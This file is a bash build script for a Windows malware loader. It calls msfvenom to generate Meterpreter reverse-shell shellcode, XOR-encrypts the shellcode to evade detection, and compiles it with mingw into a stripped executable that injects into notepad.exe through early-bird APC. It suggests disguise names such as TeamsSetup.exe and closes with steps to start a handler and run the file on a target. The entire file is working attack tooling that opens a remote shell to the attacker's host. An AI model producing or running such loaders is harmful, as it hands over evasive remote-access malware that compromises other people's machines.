#!/usr/bin/env bash
# build.sh — spawn-inject APC loader (early-bird injection into notepad.exe)
#
# Usage:
#   ./build.sh <LHOST> <LPORT> [output_name] [msf_payload]
#
# Examples — STAGED (small stager, downloads stage at runtime):
#   ./build.sh 192.168.45.227 443
#   ./build.sh 192.168.45.227 443 update.exe windows/x64/meterpreter/reverse_https
#
# Examples — STAGELESS (full Meterpreter embedded, no stage download):
#   ./build.sh 192.168.45.227 443 update.exe windows/x64/meterpreter_reverse_https
#                                                            ↑ underscore = stageless
#   ./build.sh 192.168.45.227 80  TeamsSetup.exe windows/x64/meterpreter_reverse_tcp
#
# IMPORTANT for stageless:
#   Update handler.rc to match — set PAYLOAD windows/x64/meterpreter_reverse_https
#   (with underscore) or the handler won't accept the connection.
#
# Requires: apt install -y mingw-w64   (for x86_64-w64-mingw32-gcc)
#           msfvenom, python3, openssl  (all on Kali by default)

set -euo pipefail

LHOST="${1:?Usage: ./build.sh LHOST LPORT [output_name] [msf_payload]}"
LPORT="${2:?Usage: ./build.sh LHOST LPORT [output_name] [msf_payload]}"
OUT_NAME="${3:-svcupd.exe}"
MSF_PAYLOAD="${4:-windows/x64/meterpreter/reverse_https}"

WORKDIR="$(cd "$(dirname "$0")" && pwd)"
BUILD="$WORKDIR/build"
mkdir -p "$BUILD"

RAW_SC="$BUILD/sc.bin"
ENC_SC="$BUILD/sc.enc"
KEY_BIN="$BUILD/key.bin"
C_FINAL="$BUILD/loader.gen.c"
OUT_EXE="$WORKDIR/$OUT_NAME"

# Detect staged vs stageless for informational output
if echo "$MSF_PAYLOAD" | grep -q "meterpreter_"; then
    MODE="stageless (full Meterpreter embedded — no stage download)"
else
    MODE="staged (stager only — stage downloads at runtime)"
fi

echo "[*] Payload:  $MSF_PAYLOAD  ->  $LHOST:$LPORT"
echo "[*] Mode:     $MODE"
echo "[*] Output:   $OUT_NAME"
echo

echo "[*] Generating raw shellcode with msfvenom"
msfvenom -p "$MSF_PAYLOAD" \
    LHOST="$LHOST" LPORT="$LPORT" \
    EXITFUNC=thread \
    -f raw -o "$RAW_SC" 2>/dev/null

SC_LEN=$(stat -c%s "$RAW_SC")
echo "[+] Shellcode: $SC_LEN bytes"

echo "[*] Generating fresh 32-byte XOR key"
openssl rand 32 > "$KEY_BIN"

echo "[*] XOR-encrypting shellcode"
python3 - <<PYEOF
key  = open("$KEY_BIN", "rb").read()
data = open("$RAW_SC",  "rb").read()
enc  = bytes(b ^ key[i % len(key)] for i, b in enumerate(data))
open("$ENC_SC", "wb").write(enc)
PYEOF

echo "[*] Patching loader.c template"
python3 - <<PYEOF
sc   = open("$ENC_SC",  "rb").read()
key  = open("$KEY_BIN", "rb").read()
tmpl = open("$WORKDIR/loader.c").read()
tmpl = tmpl.replace("__SC_BYTES__",  ", ".join(f"0x{b:02x}" for b in sc))
tmpl = tmpl.replace("__KEY_BYTES__", ", ".join(f"0x{b:02x}" for b in key))
open("$C_FINAL", "w").write(tmpl)
PYEOF

echo "[*] Compiling (mingw-w64, GUI subsystem, stripped, static)"
x86_64-w64-mingw32-gcc \
    -O2 -s \
    -mwindows \
    -fno-stack-protector \
    -static \
    -Wno-int-conversion \
    "$C_FINAL" \
    -o "$OUT_EXE" \
    -lkernel32

echo
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "[+] Built:    $OUT_EXE"
echo "[+] Size:     $(stat -c%s "$OUT_EXE") bytes"
echo "[+] SHA256:   $(sha256sum "$OUT_EXE" | awk '{print $1}')"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo
echo "Pattern: early-bird APC → notepad.exe"
echo "         loader exits; Meterpreter runs in notepad"
echo

if echo "$MSF_PAYLOAD" | grep -q "meterpreter_"; then
    HANDLER_PAYLOAD="$MSF_PAYLOAD"
else
    HANDLER_PAYLOAD="$MSF_PAYLOAD"
fi

echo "Next steps:"
echo "  1. Update handler.rc if needed:"
echo "       set PAYLOAD $HANDLER_PAYLOAD"
echo "       set LHOST   $LHOST"
echo "       set LPORT   $LPORT"
echo "  2. msfconsole -q -r ../handler.rc   (inside tmux)"
echo "  3. Transfer $OUT_NAME to target and execute"
